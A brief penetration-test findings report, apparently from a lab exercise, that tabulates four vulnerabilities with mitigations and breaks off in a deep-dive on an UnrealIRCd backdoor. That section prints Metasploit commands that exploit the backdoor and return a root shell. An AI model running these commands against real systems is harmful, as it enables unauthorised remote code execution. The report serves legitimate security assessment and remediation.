# 📊 Technical Findings & Patching Matrix

## 1. Vulnerability Risk Breakdown Table

| Finding ID | Vulnerability Vector Details | Severity | Vulnerable Service | Immediate Mitigation Strategy |
| :--- | :--- | :--- | :--- | :--- |
| **VULN-001** | Remote Code Execution via Backdoor | **CRITICAL** | UnrealIRCd (6667) | Immediately upgrade or patch legacy application instances; restrict port mappings. |
| **VULN-002** | Weak Password Identity Management | **HIGH** | OpenSSH (22) | Enforce complex password length criteria; mandate public-key only authentication. |
| **VULN-003** | Lack of Web Form Input Sanitization | **HIGH** | DVWA App Portal | Implement parameterized database queries and clean outbound web output encodings. |
| **VULN-004** | Plain-Text Harvest Risks (Phishing) | **MEDIUM** | Portal Logins | Deploy centralized single sign-on (SSO) layers and run user phishing defense training. |

---

## 2. Granular Deep-Dive Analysis

### VULN-001: Remote Code Execution via System Backdoor (UnrealIRCd)
* **Technical Overview:** Attackers exploited an unpatched, malicious backdoor modification present inside the target's IRC daemon software package.
* **Proof of Concept Code Block:**
```bash
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.56.102
exploit
whoami # Returns: root
